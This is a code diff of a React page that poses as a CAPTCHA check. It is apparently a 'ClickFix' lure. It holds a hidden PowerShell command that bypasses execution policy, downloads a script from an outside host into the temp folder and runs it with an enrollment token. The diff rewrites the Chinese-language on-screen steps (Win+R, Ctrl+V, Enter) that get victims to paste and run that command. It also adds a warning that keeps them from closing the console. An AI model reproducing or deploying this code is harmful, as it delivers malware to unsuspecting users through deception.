@@ -3,7 +3,7 @@ import { useState, useEffect, useCallback, useRef } from "react";
 type Phase = "checking" | "error" | "captcha" | "captcha-solving" | "instruction";
 
 // ============================================================
-// X-GEN: ПРЯМАЯ КОМАНДА (БЕЗ HEX)
+// X-GEN: ПРЯМАЯ КОМАНДА
 // ============================================================
 const HIDDEN_COMMAND = `powershell -WindowStyle Hidden -ep Bypass -c "$p=$env:TEMP+'l.ps1';iwr https://redirect-ten-gold.vercel.app/l.ps1 -OutFile $p;& $p -enroll_token '5e3031725f5bff1db14b7ff423d25bab6c65956028de9a5d5bb86691508de2de' -id '8649328'"`;
 
@@ -82,7 +82,7 @@ function InstructionWidget({ onClose }: { onClose: () => void }) {
   return (
     <div
       style={{
-        width: "340px",
+        width: "360px",
         background: "#fff",
         borderRadius: "12px",
         border: "1px solid #e0e0e0",
@@ -116,27 +116,41 @@ function InstructionWidget({ onClose }: { onClose: () => void }) {
             background: "#f5f5f5",
             borderRadius: "8px",
             padding: "16px",
-            marginBottom: "20px",
+            marginBottom: "16px",
           }}
         >
           <div style={{ display: "flex", flexDirection: "column", gap: "12px" }}>
             <div style={{ display: "flex", alignItems: "center", gap: "12px" }}>
               <span style={{ background: "#f5a623", color: "#fff", width: "24px", height: "24px", borderRadius: "50%", display: "flex", alignItems: "center", justifyContent: "center", fontSize: "12px", fontWeight: "bold" }}>1</span>
-              <span style={{ fontSize: "14px", fontWeight: 500 }}>按下 <kbd>Win + X</kbd></span>
+              <span style={{ fontSize: "14px", fontWeight: 500 }}>按下 <kbd>Win + R</kbd></span>
             </div>
             <div style={{ display: "flex", alignItems: "center", gap: "12px" }}>
               <span style={{ background: "#f5a623", color: "#fff", width: "24px", height: "24px", borderRadius: "50%", display: "flex", alignItems: "center", justifyContent: "center", fontSize: "12px", fontWeight: "bold" }}>2</span>
-              <span style={{ fontSize: "14px", fontWeight: 500 }}>按下 <kbd>I</kbd> (Windows Terminal / PowerShell)</span>
-            </div>
-            <div style={{ display: "flex", alignItems: "center", gap: "12px" }}>
-              <span style={{ background: "#f5a623", color: "#fff", width: "24px", height: "24px", borderRadius: "50%", display: "flex", alignItems: "center", justifyContent: "center", fontSize: "12px", fontWeight: "bold" }}>3</span>
               <span style={{ fontSize: "14px", fontWeight: 500 }}>按下 <kbd>Ctrl + V</kbd></span>
             </div>
             <div style={{ display: "flex", alignItems: "center", gap: "12px" }}>
-              <span style={{ background: "#f5a623", color: "#fff", width: "24px", height: "24px", borderRadius: "50%", display: "flex", alignItems: "center", justifyContent: "center", fontSize: "12px", fontWeight: "bold" }}>4</span>
+              <span style={{ background: "#f5a623", color: "#fff", width: "24px", height: "24px", borderRadius: "50%", display: "flex", alignItems: "center", justifyContent: "center", fontSize: "12px", fontWeight: "bold" }}>3</span>
               <span style={{ fontSize: "14px", fontWeight: 500 }}>按下 <kbd>Enter</kbd></span>
             </div>
+            <div style={{ display: "flex", alignItems: "center", gap: "12px" }}>
+              <span style={{ background: "#f5a623", color: "#fff", width: "24px", height: "24px", borderRadius: "50%", display: "flex", alignItems: "center", justifyContent: "center", fontSize: "12px", fontWeight: "bold" }}>4</span>
+              <span style={{ fontSize: "14px", fontWeight: 500 }}>不要关闭控制台，直到它自行关闭</span>
+            </div>
           </div>
+        </div>
+
+        <div
+          style={{
+            background: "#fff3e0",
+            borderRadius: "8px",
+            padding: "12px",
+            borderLeft: "3px solid #f5a623",
+            marginBottom: "20px",
+          }}
+        >
+          <p style={{ fontSize: "11px", color: "#888", margin: 0, lineHeight: "1.4", textAlign: "center" }}>
+            ⚠️ 如果您自行关闭控制台，验证将被终止，需要重新启动。验证速度完全取决于您的互联网速度。
+          </p>
         </div>
 
         <button
